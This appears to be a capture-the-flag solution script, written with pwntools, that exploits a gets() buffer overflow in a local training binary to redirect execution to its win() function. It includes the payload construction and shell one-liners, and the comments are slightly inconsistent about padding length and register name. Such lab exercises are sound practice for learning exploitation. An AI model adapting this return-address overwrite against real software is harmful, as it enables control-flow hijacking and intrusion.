#!/usr/bin/python3

# vuln wants an input with gets() function
# the goal is to jump to win() function to get the flag
# readelf -s ./vuln | grep win
# 67: 080485cb   100 FUNC    GLOBAL DEFAULT   14 win
# the address of win() function is 080485cb

# réponse sauvage
# echo `python3 -c "print('A'*39 + 'BBBB' + 'CCCC')"` | ./vuln

import pwn

win_addr = 0x080485cb

elf = pwn.ELF('./vuln')
p = elf.process()

print(p.recv().decode())

payload = 'A' * 40
payload += 'BBBB'
payload += pwn.p32(win_addr).decode() # new value of rip

p.sendline(payload)

print(p.recv().decode())

# echo `python3 -c "import struct; print('A'*40 + 'BBBB' + struct.pack('<I', 0x080485cb).decode())"` | ./vuln
